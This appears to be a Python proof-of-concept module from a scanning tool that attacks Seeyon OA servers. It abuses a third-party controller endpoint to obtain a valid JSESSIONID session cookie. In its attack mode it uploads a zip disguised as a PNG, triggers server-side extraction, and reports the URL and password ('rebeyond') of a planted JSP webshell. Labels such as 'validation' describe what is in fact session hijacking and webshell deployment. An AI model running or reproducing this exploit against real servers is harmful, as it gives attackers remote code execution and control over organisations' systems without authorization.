from __future__ import annotations

import re
import time
from pathlib import Path

import requests

from poc import core


def get_session(url, attack):
    name = "session disclosure and file-upload validation"
    core.start_echo(name)
    path = "/seeyon/thirdpartyController.do"
    header = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = (
        "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+"
        "LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    )
    response = core.post(url, path, header, data)
    if (
        response is None
        or response.status_code != 200
        or "a8genius.do" not in response.text
        or "set-cookie" not in str(response.headers).lower()
    ):
        core.end_echo(name)
        return

    cookies = requests.utils.dict_from_cookiejar(response.cookies)
    cookie = cookies.get("JSESSIONID")
    if not cookie:
        core.end_echo(name)
        return
    core.result(name, url + path, "JSESSIONID=" + cookie)
    if attack:
        file_upload(url, cookie, name)
    else:
        core.end_echo(name, "sensitive session evidence")


def file_upload(url, cookie, name):
    path = "/seeyon/fileUpload.do?method=processUpload"
    print("[#] validating upload path")
    payload_path = Path(__file__).resolve().parent / "TEST233.zip"
    header = {"Cookie": "JSESSIONID=%s" % cookie}
    data = {
        "callMethod": "resizeLayout",
        "firstSave": "true",
        "takeOver": "false",
        "type": "0",
        "isEncrypt": "0",
    }
    with payload_path.open("rb") as payload_file:
        files = [("file1", ("test.png", payload_file, "image/png"))]
        response = core.post(url, path, header, data, files)
    if response is None:
        print("[#] upload validation failed: request error")
        return
    filenames = re.findall(r"fileurls=fileurls\+,\"\+\'(.+)\'", response.text, re.I)
    if not filenames:
        print("[#] upload validation failed")
        return
    print("[#] upload accepted; validating extraction")
    unzip(header, url, filenames[0], cookie, name)


def unzip(header, url, filename, cookie, name):
    path = "/seeyon/ajax.do"
    now = time.strftime("%Y-%m-%d")
    data = (
        "method=ajaxAction&managerName=portalDesignerManager&"
        "managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22"
        + now
        + "%22%2C%22"
        + filename
        + "%22%5D"
    )
    request_header = dict(header)
    request_header["Content-Type"] = "application/x-www-form-urlencoded"
    response = core.post(url, path, request_header, data)
    if response is None or response.status_code != 500:
        print("[#] extraction validation failed")
        return

    webshell_url = url + "/seeyon/common/designer/pageLayout/test233.jsp"
    core.result(
        name,
        webshell_url,
        "webshell_password=rebeyond JSESSIONID=" + cookie,
    )
    core.sensitive_success(name)
